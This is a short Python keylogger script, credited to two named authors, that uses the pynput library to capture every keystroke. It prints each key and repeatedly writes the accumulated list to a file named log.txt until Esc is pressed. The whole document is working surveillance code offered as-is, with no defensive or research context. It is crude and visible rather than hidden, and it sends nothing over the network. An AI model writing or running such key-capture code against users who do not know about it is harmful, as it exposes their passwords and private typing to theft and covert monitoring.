#coded by Raj Mehta & Vatsal Sharma 
#dated 11 Nov 2020

from pynput.keyboard import Key, Listener

count = 0
keys = []

def on_press(key):
    global keys,count
    keys.append(key)
    count+=1
    print(count)


    print("{0} pressed".format(key))

    def write_file(key1):
        f= open("log.txt","w+")
        for key in key1:
            f.write(key)
        f.write("\n")
        f.write("\n")
        f.write("\n")
        f.close()

    if count>= 10:
        count=0
        write_file(str(keys))


   
def on_release(key):
    if key==Key.esc:
        return False

with Listener(on_press=on_press, on_release= on_release) as listener:
    listener.join()

